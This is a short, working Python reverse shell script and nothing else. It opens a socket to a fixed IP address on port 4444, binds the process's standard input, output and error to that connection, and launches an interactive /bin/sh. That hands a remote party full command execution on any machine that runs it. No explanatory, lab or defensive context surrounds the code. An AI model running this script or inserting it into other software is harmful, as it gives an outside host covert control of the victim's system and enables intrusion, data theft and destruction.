#!/usr/bin/env python3
import socket,subprocess,os
s = socket.socket()
s.connect(("10.64.148.103", 4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])
